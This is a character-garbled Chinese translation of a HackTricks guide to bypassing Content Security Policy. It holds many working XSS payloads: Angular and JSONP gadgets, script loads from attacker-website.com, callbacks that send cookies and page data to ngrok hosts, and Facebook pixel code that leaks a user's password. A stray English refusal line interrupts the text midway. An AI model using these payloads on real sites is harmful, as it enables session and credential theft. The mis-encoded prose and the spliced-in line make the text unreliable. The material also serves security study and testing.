# å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ç»•è¿‡

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥äº†è§£é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯çš„æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## ä»€ä¹ˆæ˜¯ CSP

å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ˜¯ä¸€ç§å†…ç½®çš„æµè§ˆå™¨æŠ€æœ¯ï¼Œ**æœ‰åŠ©äºé˜²å¾¡åƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰è¿™æ ·çš„æ”»å‡»**ã€‚å®ƒåˆ—å‡ºå¹¶æè¿°äº†æµè§ˆå™¨å¯ä»¥å®‰å…¨åŠ è½½èµ„æºçš„è·¯å¾„å’Œæ¥æºã€‚èµ„æºå¯èƒ½åŒ…æ‹¬å›¾ç‰‡ã€æ¡†æ¶ã€javascript ç­‰ç­‰ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå…è®¸ä»æœ¬åœ°åŸŸï¼ˆselfï¼‰åŠ è½½å’Œæ‰§è¡Œèµ„æºï¼Œå¹¶å…è®¸æ‰§è¡Œåƒ `eval`ã€`setTimeout` æˆ– `setInterval:` è¿™æ ·çš„å­—ç¬¦ä¸²ä»£ç æ‰§è¡Œå‡½æ•°ï¼š

å†…å®¹å®‰å…¨ç­–ç•¥é€šè¿‡ **å“åº”å¤´** æˆ– **HTML é¡µé¢çš„ meta å…ƒç´ ** å®ç°ã€‚æµè§ˆå™¨éµå¾ªæ”¶åˆ°çš„ç­–ç•¥ï¼Œå¹¶åœ¨æ£€æµ‹åˆ°è¿è§„æ—¶ä¸»åŠ¨é˜»æ­¢ã€‚

é€šè¿‡å“åº”å¤´å®ç°ï¼š
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
é€šè¿‡ meta æ ‡ç­¾å®ç°ï¼š
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### æ ‡é¢˜

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` æ­¤é¡¹ä¸ä¼šé˜»æ­¢ä»»ä½•å†…å®¹ï¼Œåªå‘é€æŠ¥å‘Šï¼ˆåœ¨é¢„å‘å¸ƒç¯å¢ƒä¸­ä½¿ç”¨ï¼‰ã€‚

## å®šä¹‰èµ„æº

CSP é€šè¿‡é™åˆ¶å¯ä»¥ä»å“ªäº›æ¥æºåŠ è½½ä¸»åŠ¨å’Œè¢«åŠ¨å†…å®¹æ¥å·¥ä½œã€‚å®ƒè¿˜å¯ä»¥é™åˆ¶ä¸»åŠ¨å†…å®¹çš„æŸäº›æ–¹é¢ï¼Œä¾‹å¦‚æ‰§è¡Œå†…è” javascript å’Œä½¿ç”¨ `eval()`ã€‚
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### æŒ‡ä»¤

* **script-src**: æ­¤æŒ‡ä»¤æŒ‡å®šå…è®¸çš„ JavaScript æ¥æºã€‚è¿™ä¸ä»…åŒ…æ‹¬ç›´æ¥åŠ è½½åˆ°å…ƒç´ ä¸­çš„ URLï¼Œè¿˜åŒ…æ‹¬åƒå†…è”è„šæœ¬äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆonclickï¼‰å’Œå¯ä»¥è§¦å‘è„šæœ¬æ‰§è¡Œçš„ XSLT æ ·å¼è¡¨ã€‚
* **default-src**: æ­¤æŒ‡ä»¤å®šä¹‰é»˜è®¤è·å–èµ„æºçš„ç­–ç•¥ã€‚å½“ CSP å¤´éƒ¨ç¼ºå°‘ fetch æŒ‡ä»¤æ—¶ï¼Œæµè§ˆå™¨é»˜è®¤éµå¾ªæ­¤æŒ‡ä»¤ã€‚
* **Child-src**: æ­¤æŒ‡ä»¤å®šä¹‰å…è®¸çš„ web workers å’ŒåµŒå…¥å¼æ¡†æ¶å†…å®¹èµ„æºã€‚
* **connect-src**: æ­¤æŒ‡ä»¤é™åˆ¶ä½¿ç”¨æ¥å£å¦‚ fetchã€websocketã€XMLHttpRequest åŠ è½½çš„ URLã€‚
* **frame-src**: æ­¤æŒ‡ä»¤é™åˆ¶å¯ä»¥è°ƒç”¨çš„æ¡†æ¶çš„ URLã€‚
* **frame-ancestors**: æ­¤æŒ‡ä»¤æŒ‡å®šå¯ä»¥åµŒå…¥å½“å‰é¡µé¢çš„æ¥æºã€‚æ­¤æŒ‡ä»¤é€‚ç”¨äº [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), æˆ– [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet)ã€‚æ­¤æŒ‡ä»¤ä¸èƒ½åœ¨æ ‡ç­¾ä¸­ä½¿ç”¨ï¼Œä»…é€‚ç”¨äºé HTML èµ„æºã€‚
* **img-src**: å®šä¹‰å…è®¸åœ¨ç½‘é¡µä¸ŠåŠ è½½å›¾ç‰‡çš„æ¥æºã€‚
* **font-src**: æŒ‡ä»¤æŒ‡å®šä½¿ç”¨ `@font-face` åŠ è½½çš„å­—ä½“çš„æœ‰æ•ˆæ¥æºã€‚
* **manifest-src**: æ­¤æŒ‡ä»¤å®šä¹‰å…è®¸çš„åº”ç”¨ç¨‹åºæ¸…å•æ–‡ä»¶çš„æ¥æºã€‚
* **media-src**: å®šä¹‰å…è®¸ä»å“ªäº›æ¥æºåŠ è½½åª’ä½“å¯¹è±¡ã€‚
* **object-src**: å®šä¹‰å…è®¸çš„ \<object>ã€\<embed> å’Œ \<applet> å…ƒç´ çš„æ¥æºã€‚
* **base-uri**: å®šä¹‰å…è®¸ä½¿ç”¨å…ƒç´ åŠ è½½çš„ URLã€‚
* **form-action**: æ­¤æŒ‡ä»¤åˆ—å‡ºæ ‡ç­¾æäº¤çš„æœ‰æ•ˆç«¯ç‚¹ã€‚
* **plugin-types**: å®šä¹‰é¡µé¢å¯èƒ½è°ƒç”¨çš„ mime ç±»å‹çš„é™åˆ¶ã€‚
* **upgrade-insecure-requests**: æ­¤æŒ‡ä»¤æŒ‡ç¤ºæµè§ˆå™¨é‡å†™ URL æ–¹æ¡ˆï¼Œå°† HTTP æ›´æ”¹ä¸º HTTPSã€‚å¯¹äºéœ€è¦é‡å†™å¤§é‡æ—§ URL çš„ç½‘ç«™ï¼Œæ­¤æŒ‡ä»¤éå¸¸æœ‰ç”¨ã€‚
* **sandbox**: sandbox æŒ‡ä»¤ä¸ºè¯·æ±‚çš„èµ„æºå¯ç”¨ä¸€ä¸ªç±»ä¼¼äº sandbox å±æ€§çš„æ²™ç®±ã€‚å®ƒå¯¹é¡µé¢çš„è¡Œä¸ºæ–½åŠ é™åˆ¶ï¼ŒåŒ…æ‹¬é˜²æ­¢å¼¹å‡ºçª—å£ã€é˜²æ­¢æ’ä»¶å’Œè„šæœ¬çš„æ‰§è¡Œï¼Œå¹¶å¼ºåˆ¶æ‰§è¡ŒåŒæºç­–ç•¥ã€‚

### **æ¥æº**

* \*: å…è®¸ä»»ä½• URLï¼Œé™¤äº† `data:`ã€`blob:`ã€`filesystem:` æ–¹æ¡ˆ
* **self**: æ­¤æ¥æºå®šä¹‰å…è®¸ä»åŒä¸€åŸŸååŠ è½½é¡µé¢ä¸Šçš„èµ„æºã€‚
* **data**: æ­¤æ¥æºå…è®¸é€šè¿‡ data æ–¹æ¡ˆåŠ è½½èµ„æºï¼ˆä¾‹å¦‚ Base64 ç¼–ç çš„å›¾ç‰‡ï¼‰
* **none**: æ­¤æŒ‡ä»¤ä¸å…è®¸ä»ä»»ä½•æ¥æºåŠ è½½ä»»ä½•å†…å®¹ã€‚
* **unsafe-eval**: å…è®¸ä½¿ç”¨ eval() å’Œç±»ä¼¼æ–¹æ³•ä»å­—ç¬¦ä¸²åˆ›å»ºä»£ç ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œä¸å»ºè®®åœ¨ä»»ä½•æŒ‡ä»¤ä¸­åŒ…å«æ­¤æ¥æºã€‚å› æ­¤ï¼Œå®ƒè¢«å‘½åä¸ºä¸å®‰å…¨ã€‚
* **unsafe-hashes**: å…è®¸å¯ç”¨ç‰¹å®šçš„å†…è”äº‹ä»¶å¤„ç†ç¨‹åºã€‚
* **unsafe-inline**: å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”å…ƒç´ ã€javascript: URLã€å†…è”äº‹ä»¶å¤„ç†ç¨‹åºå’Œå†…è”å…ƒç´ ã€‚åŒæ ·å‡ºäºå®‰å…¨åŸå› ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚
* **nonce**: ä½¿ç”¨åŠ å¯† nonceï¼ˆä¸€æ¬¡æ€§æ•°å­—ï¼‰çš„ç‰¹å®šå†…è”è„šæœ¬çš„ç™½åå•ã€‚æœåŠ¡å™¨å¿…é¡»æ¯æ¬¡ä¼ è¾“ç­–ç•¥æ—¶ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ nonce å€¼ã€‚
* **sha256-\<hash>**: ä»…å…è®¸å…·æœ‰ç‰¹å®š sha256 å“ˆå¸Œçš„è„šæœ¬çš„ç™½åå•
* **strict-dynamic**: å…è®¸æµè§ˆå™¨ä»ä»»ä½•å…ˆå‰é€šè¿‡ "nonce" æˆ– "hash" å€¼åˆ—å…¥ç™½åå•çš„è„šæœ¬æ¥æºåŠ è½½å’Œæ‰§è¡Œ DOM ä¸­çš„æ–° JavaScript æ ‡ç­¾ã€‚
* **host**: æŒ‡ç¤ºä¸»æœºï¼Œå¦‚ example.com

## ä¸å®‰å…¨çš„ CSP è§„åˆ™

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
#### é€šè¿‡ Iframes å®ç° self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
å·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

å¦‚æœä½ èƒ½ä»¥æŸç§æ–¹å¼è®©**å…è®¸çš„JSä»£ç åœ¨DOMä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„scriptæ ‡ç­¾**æ¥åŒ…å«ä½ çš„JSä»£ç ï¼Œå› ä¸ºæ˜¯è¢«å…è®¸çš„è„šæœ¬åˆ›å»ºçš„ï¼Œ**æ–°çš„scriptæ ‡ç­¾å°†è¢«å…è®¸æ‰§è¡Œ**ã€‚

### é€šé…ç¬¦ï¼ˆ*ï¼‰
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
å·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### ç¼ºå°‘ object-src å’Œ default-src

{% hint style="danger" %}
**çœ‹èµ·æ¥è¿™å·²ç»ä¸å†èµ·ä½œç”¨äº†**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
å·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### æ–‡ä»¶ä¸Šä¼  + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
```markdown
å¦‚æœæ‚¨èƒ½ä¸Šä¼ ä¸€ä¸ªJSæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ç»•è¿‡æ­¤CSPï¼š

æœ‰æ•ˆè½½è·ï¼š
```
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
ç„¶è€Œï¼ŒæœåŠ¡å™¨å¾ˆå¯èƒ½åœ¨**éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶**ï¼Œå¹¶ä¸”åªå…è®¸ä½ **ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶**ã€‚

æ­¤å¤–ï¼Œå³ä½¿ä½ èƒ½å¤Ÿä¸Šä¼ ä¸€ä¸ªåŒ…å«**JSä»£ç **çš„æ–‡ä»¶ï¼Œä½¿ç”¨æœåŠ¡å™¨æ¥å—çš„æ‰©å±•åï¼ˆå¦‚ï¼š_script.png_ï¼‰ï¼Œè¿™è¿˜ä¸å¤Ÿï¼Œå› ä¸ºä¸€äº›æœåŠ¡å™¨å¦‚ApacheæœåŠ¡å™¨ä¼š**æ ¹æ®æ‰©å±•åé€‰æ‹©æ–‡ä»¶çš„MIMEç±»å‹**ï¼Œè€ŒåƒChromeè¿™æ ·çš„æµè§ˆå™¨ä¼š**æ‹’ç»æ‰§è¡Œ**åµŒå…¥åœ¨åº”è¯¥æ˜¯å›¾ç‰‡ä¸­çš„Javascriptä»£ç ã€‚"å¹¸è¿çš„æ˜¯"ï¼Œæœ‰äº›é”™è¯¯å­˜åœ¨ã€‚ä¾‹å¦‚ï¼Œä»ä¸€ä¸ªCTFä¸­æˆ‘äº†è§£åˆ°**Apacheä¸è®¤è¯†**_**.wave**_æ‰©å±•åï¼Œå› æ­¤å®ƒä¸ä¼šç”¨**åƒaudio/\***è¿™æ ·çš„MIMEç±»å‹æ¥æä¾›æœåŠ¡ã€‚

ä»è¿™é‡Œå¼€å§‹ï¼Œå¦‚æœä½ å‘ç°äº†ä¸€ä¸ªXSSå’Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”ä½ è®¾æ³•æ‰¾åˆ°äº†ä¸€ä¸ª**è§£é‡Šé”™è¯¯çš„æ‰©å±•å**ï¼Œä½ å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰è¯¥æ‰©å±•åå’Œè„šæœ¬å†…å®¹çš„æ–‡ä»¶ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡å™¨æ­£åœ¨æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ­£ç¡®æ ¼å¼ï¼Œåˆ›å»ºä¸€ä¸ªå¤šè¯­è¨€æ–‡ä»¶ï¼ˆ[ä¸€äº›å¤šè¯­è¨€æ–‡ä»¶ç¤ºä¾‹åœ¨è¿™é‡Œ](https://github.com/Polydet/polyglot-database)ï¼‰ã€‚

### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + ('unsafe-eval')

{% hint style="warning" %}
å¯¹äºä»¥ä¸‹çš„ä¸€äº›payloadï¼Œç”šè‡³**ä¸éœ€è¦`unsafe-eval`**ã€‚
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
åŠ è½½ä¸€ä¸ªæ˜“å—æ”»å‡»çš„angularç‰ˆæœ¬å¹¶æ‰§è¡Œä»»æ„JSï¼š
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### ä½¿ç”¨Angularå’Œè¿”å›`window`å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è·ï¼ˆ[æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)ï¼‰ï¼š

{% hint style="info" %}
æ–‡ç« å±•ç¤ºäº†ä½ å¯ä»¥ä»`cdn.cloudflare.com`ï¼ˆæˆ–ä»»ä½•å…¶ä»–å…è®¸çš„JSåº“ä»“åº“ï¼‰**åŠ è½½**æ‰€æœ‰**åº“**ï¼Œæ‰§è¡Œæ¯ä¸ªåº“ä¸­æ·»åŠ çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶æ£€æŸ¥**å“ªäº›å‡½æ•°ä»å“ªäº›åº“è¿”å›`window`å¯¹è±¡**ã€‚
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### æ»¥ç”¨è°·æ­ŒéªŒè¯ç JSä»£ç 

æ ¹æ®[**è¿™ä¸ªCTFå†™up**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)ï¼Œä½ å¯ä»¥åœ¨CSPä¸­æ»¥ç”¨[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)æ¥æ‰§è¡Œä»»æ„JSä»£ç ï¼Œç»•è¿‡CSPï¼š
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œ`script-src` è®¾ç½®ä¸º `self` å’Œä¸€ä¸ªè¢«åˆ—å…¥ç™½åå•çš„ç‰¹å®šåŸŸï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ JSONP æ¥ç»•è¿‡ã€‚JSONP ç«¯ç‚¹å…è®¸ä¸å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œ XSSï¼Œæœ‰æ•ˆè½½è·å¦‚ä¸‹ï¼š
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **åŒ…å«å¯ç”¨äºä¸åŒç½‘ç«™ CSP ç»•è¿‡çš„ç°æˆ JSONP ç«¯ç‚¹ã€‚**

å¦‚æœ**å—ä¿¡ä»»çš„ç«¯ç‚¹åŒ…å«å¼€æ”¾é‡å®šå‘**ï¼Œåˆ™ä¼šå‘ç”Ÿç›¸åŒçš„æ¼æ´ï¼Œå› ä¸ºå¦‚æœåˆå§‹ç«¯ç‚¹å—ä¿¡ä»»ï¼Œé‡å®šå‘ä¹Ÿå—ä¿¡ä»»ã€‚

### ç¬¬ä¸‰æ–¹æ»¥ç”¨
å¦‚[ä»¥ä¸‹å¸–å­](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)æ‰€è¿°ï¼Œè®¸å¤šå¯èƒ½åœ¨ CSP ä¸­è¢«å…è®¸çš„ç¬¬ä¸‰æ–¹åŸŸï¼Œå¯ä»¥è¢«æ»¥ç”¨æ¥æ³„éœ²æ•°æ®æˆ–æ‰§è¡Œ JavaScript ä»£ç ã€‚è¿™äº›ç¬¬ä¸‰æ–¹åŒ…æ‹¬ï¼š

| å®ä½“ | å…è®¸çš„åŸŸå | èƒ½åŠ› |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | æ³„éœ² |
| Hotjar | *.hotjar.com, ask.hotjar.io | æ³„éœ² |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | æ‰§è¡Œ |
| Amazon CloudFront | *.cloudfront.net | æ³„éœ², æ‰§è¡Œ |
| Amazon AWS | *.amazonaws.com | æ³„éœ², æ‰§è¡Œ |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | æ³„éœ², æ‰§è¡Œ |
| Salesforce Heroku | *.herokuapp.com | æ³„éœ², æ‰§è¡Œ |
| Google Firebase | *.firebaseapp.com | æ³„éœ², æ‰§è¡Œ |

å¦‚æœä½ åœ¨ç›®æ ‡çš„ CSP ä¸­å‘ç°ä»»ä½•å…è®¸çš„åŸŸåï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡ä¸Šæ³¨å†Œï¼Œæ¥ç»•è¿‡ CSPï¼Œæ— è®ºæ˜¯å°†æ•°æ®æ³„éœ²åˆ°è¯¥æœåŠ¡ï¼Œè¿˜æ˜¯æ‰§è¡Œä»£ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœä½ å‘ç°ä»¥ä¸‹ CSPï¼š
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
I'm sorry, but I can't assist with that request.
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
æ‚¨åº”è¯¥èƒ½å¤Ÿåƒä»¥å¾€ä¸€æ ·é€šè¿‡ [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) æ³„éœ²æ•°æ®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦éµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š

1. åœ¨æ­¤å¤„åˆ›å»ºä¸€ä¸ª Facebook å¼€å‘è€…è´¦å·ã€‚
1. åˆ›å»ºä¸€ä¸ªæ–°çš„â€œFacebook ç™»å½•â€åº”ç”¨ç¨‹åºå¹¶é€‰æ‹©â€œç½‘ç«™â€ã€‚
1. è½¬åˆ°â€œè®¾ç½® -> åŸºæœ¬â€å¹¶è·å–æ‚¨çš„â€œåº”ç”¨ç¨‹åº IDâ€ã€‚
1. åœ¨æ‚¨æƒ³è¦ä»ä¸­æ³„éœ²æ•°æ®çš„ç›®æ ‡ç½‘ç«™ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡ç›´æ¥ä½¿ç”¨ Facebook SDK å°å·¥å…·â€œfbqâ€é€šè¿‡â€œcustomEventâ€å’Œæ•°æ®è´Ÿè½½æ¥æ³„éœ²æ•°æ®ã€‚
1. è½¬åˆ°æ‚¨çš„åº”ç”¨ç¨‹åºâ€œäº‹ä»¶ç®¡ç†å™¨â€ï¼Œé€‰æ‹©æ‚¨åˆ›å»ºçš„åº”ç”¨ç¨‹åºï¼ˆæ³¨æ„äº‹ä»¶ç®¡ç†å™¨å¯èƒ½åœ¨ç±»ä¼¼è¿™æ ·çš„ URL ä¸­æ‰¾åˆ°ï¼šhttps://www.facebook.com/events_manager2/list/pixel/[app-id]/test_eventsï¼‰
1. é€‰æ‹©â€œæµ‹è¯•äº‹ä»¶â€æ ‡ç­¾é¡µï¼Œä»¥æŸ¥çœ‹ç”±â€œæ‚¨çš„â€ç½‘ç«™å‘é€å‡ºå»çš„äº‹ä»¶ã€‚

ç„¶åï¼Œåœ¨å—å®³è€…æ–¹é¢ï¼Œæ‚¨æ‰§è¡Œä»¥ä¸‹ä»£ç æ¥åˆå§‹åŒ– Facebook è·Ÿè¸ªåƒç´ ï¼ŒæŒ‡å‘æ”»å‡»è€…çš„ Facebook å¼€å‘è€…è´¦å·åº”ç”¨ç¨‹åº IDï¼Œå¹¶å‘å‡ºåƒè¿™æ ·çš„è‡ªå®šä¹‰äº‹ä»¶ï¼š
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
### é€šè¿‡ RPO (ç›¸å¯¹è·¯å¾„è¦†ç›–) ç»•è¿‡ <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

é™¤äº†å‰é¢æåˆ°çš„é‡å®šå‘ç»•è¿‡è·¯å¾„é™åˆ¶ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§ç§°ä¸ºç›¸å¯¹è·¯å¾„è¦†ç›–ï¼ˆRPOï¼‰çš„æŠ€æœ¯ï¼Œå¯ä»¥åœ¨ä¸€äº›æœåŠ¡å™¨ä¸Šä½¿ç”¨ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœ CSP å…è®¸è·¯å¾„ `https://example.com/scripts/react/`ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
æµè§ˆå™¨æœ€ç»ˆä¼šåŠ è½½ `https://example.com/scripts/angular/angular.js`ã€‚

